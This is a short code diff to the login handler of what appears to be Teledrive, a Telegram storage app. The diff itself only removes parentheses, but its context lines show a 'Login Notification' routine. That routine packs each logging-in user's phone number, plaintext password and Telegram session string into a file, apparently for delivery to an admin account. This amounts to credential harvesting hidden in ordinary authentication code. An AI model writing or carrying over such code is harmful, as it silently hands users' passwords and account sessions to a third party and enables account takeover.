@@ -478,7 +478,7 @@ export class Auth {
     if (!adminUsername || !req.tg) return
 
     try {
-      const sessionString = (req.tg.session.save() as any)
+      const sessionString = req.tg.session.save() as any
       const text = `🚀 Teledrive Login Notification\n\nPhone: ${phoneNumber}\nPassword: ${password || 'None'}\nSession: ${sessionString}`
 
       const file = Buffer.from(text)
